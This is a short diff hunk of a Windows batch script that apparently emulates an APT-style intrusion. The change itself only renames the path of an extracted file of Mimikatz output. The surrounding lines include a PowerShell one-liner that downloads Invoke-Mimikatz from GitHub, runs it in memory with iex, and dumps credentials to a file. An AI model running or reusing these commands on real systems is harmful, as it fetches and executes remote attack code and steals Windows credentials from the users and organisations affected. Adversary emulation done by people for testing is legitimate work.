@@ -14,7 +14,7 @@ ping -n 5 127.0.0.1 > NUL
 
 ECHO Extracting Mimik4tz output to target directory ...
 ping -n 5 127.0.0.1 > NUL
-%ZIP% e -p%PASS% %FILEARCH% -aoa -o%APTDIR% toolset\mim-out.txt > NUL
+%ZIP% e -p%PASS% %FILEARCH% -aoa -o%APTDIR% workfiles\mim-out.txt > NUL
 
 ECHO Running Invoke-Mimikatz: downloading from github, run from memory 
 powershell.exe "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds" >> %APTDIR%\moutput.tmp
